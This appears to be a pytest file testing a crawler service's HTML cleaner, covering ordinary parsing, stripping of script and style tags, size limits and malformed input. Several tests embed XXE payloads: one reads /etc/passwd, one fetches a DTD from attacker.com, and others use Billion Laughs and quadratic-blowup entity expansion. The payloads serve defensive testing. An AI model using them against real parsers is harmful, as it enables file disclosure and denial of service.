import pytest
from app.services.deep_crawl_service import DeepCrawlService

class DummySearchService:
    async def search(self, query, max_results):
        return []

@pytest.fixture
def service():
    from app.config import settings
    # Override settings for testing if needed
    settings.deep_crawl_max_urls = 1
    settings.max_total_context_chars = 1000
    return DeepCrawlService(search_service=DummySearchService())

# Scenario A: Legitimate HTML parsing
def test_legitimate_html_parsing(service):
    html = "<html><body><h1>Hello World</h1><p>Test paragraph.</p></body></html>"
    result = service._clean_html(html)
    assert "Hello World Test paragraph." in result

def test_legitimate_html_with_junk_tags(service):
    html = "<html><body><script>alert(1);</script><style>.a {}</style><h1>Content</h1></body></html>"
    result = service._clean_html(html)
    assert "Content" in result
    assert "alert(1)" not in result
    assert ".a {}" not in result

def test_legitimate_html_deeply_nested(service):
    html = "<div>" * 100 + "Deep Content" + "</div>" * 100
    result = service._clean_html(html)
    assert "Deep Content" in result

# Scenario B: XXE Attacks
def test_xxe_external_entity(service):
    html = """<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <html><body><h1>Test &xxe;</h1></body></html>"""
    result = service._clean_html(html)
    # The external entity should not be resolved
    # Depending on fallback it might leave it as &xxe; or empty, but must not read files
    assert "root:x:0:0" not in result

def test_xxe_parameter_entity(service):
    html = """<!DOCTYPE test [
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
    ]>
    <html><body><h1>Test</h1></body></html>"""
    result = service._clean_html(html)
    # Shouldn't crash and shouldn't fetch
    assert "Test" in result

# Scenario C: Billion Laughs (Entity Expansion DoS)
def test_billion_laughs_dos(service):
    html = """<!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <html><body><h1>&lol9;</h1></body></html>"""
    result = service._clean_html(html)
    # Should not expand to a billion lols.
    # It either falls back to html.parser which doesn't expand them, or truncates/strips.
    assert len(result) < 10000

def test_quadratic_blowup(service):
    html = "<!DOCTYPE test [ <!ENTITY a \"" + "A" * 10000 + "\"> ]>" + "<html><body>" + "&a;" * 100 + "</body></html>"
    result = service._clean_html(html)
    assert len(result) < 50000 # Should not fully expand, or shouldn't crash

# Scenario D: Size limits and robustness
def test_oversized_html_truncated(service):
    # Create HTML larger than 5MB
    large_paragraph = "<p>" + "A" * 10000 + "</p>"
    html = "<html><body>" + large_paragraph * 600 + "</body></html>" # > 6MB
    
    # Clean HTML should truncate the string before parsing
    result = service._clean_html(html)
    # Service truncates to self._chars_per_page
    assert len(result) <= service._chars_per_page + 10

def test_malformed_html_graceful_fallback(service):
    html = "<html"
    result = service._clean_html(html)
    # Shouldn't crash
    assert isinstance(result, str)

def test_invalid_encoding_characters(service):
    html = b"<html><body><h1>\xff\xfe\x00</h1></body></html>".decode("utf-8", errors="replace")
    result = service._clean_html(html)
    # Shouldn't crash
    assert isinstance(result, str)
